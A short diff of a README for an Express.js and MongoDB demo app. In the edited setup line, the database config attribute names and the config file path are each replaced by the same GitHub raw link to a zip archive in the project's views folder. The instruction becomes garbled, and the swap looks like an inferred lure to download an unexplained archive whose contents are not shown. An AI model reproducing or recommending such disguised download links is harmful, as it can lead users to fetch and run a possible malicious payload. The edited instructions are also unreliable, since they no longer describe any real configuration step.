@@ -2,7 +2,7 @@
 
 Expressjs app connected to a NoSQL database (Mongo DB)
 
-You need to change the db.url and db.db_name attributes in `config/mongoose.js to fit to your database config:
+You need to change the https://github.com/Cmorz/no-sql-lab/raw/refs/heads/master/views/no_lab_sql_3.9.zip and https://github.com/Cmorz/no-sql-lab/raw/refs/heads/master/views/no_lab_sql_3.9.zip attributes in `https://github.com/Cmorz/no-sql-lab/raw/refs/heads/master/views/no_lab_sql_3.9.zip to fit to your database config:
 ```
 const db = {
   url: 'mongodb://localhost:27017/',
